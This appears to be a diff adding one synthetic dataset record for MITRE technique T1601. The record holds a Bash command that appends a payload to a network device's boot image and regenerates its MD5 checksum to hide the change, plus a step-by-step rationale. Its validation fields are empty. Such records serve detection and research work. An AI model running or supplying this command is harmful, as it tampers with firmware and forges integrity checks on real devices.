@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1601",
+  "platform": "Network Devices",
+  "shell": "Bash",
+  "command": "cat /tmp/append.bin >> /bootflash/active.img && sync && md5sum /bootflash/active.img > /etc/firmware/active.img.md5",
+  "explanation": "Appends malicious content to the system image and recalculates its checksum to make the modification appear legitimate.",
+  "rationale_steps": [
+    "Append payload data to the existing system image",
+    "Flush writes to ensure the modified image is persisted",
+    "Regenerate and store the MD5 to match the altered image"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1601-3f5b9fd2-fa95997f",
+  "source_prompt_hash": "3f5b9fd2",
+  "timestamp_utc": "2025-09-30T04:34:26.844102Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
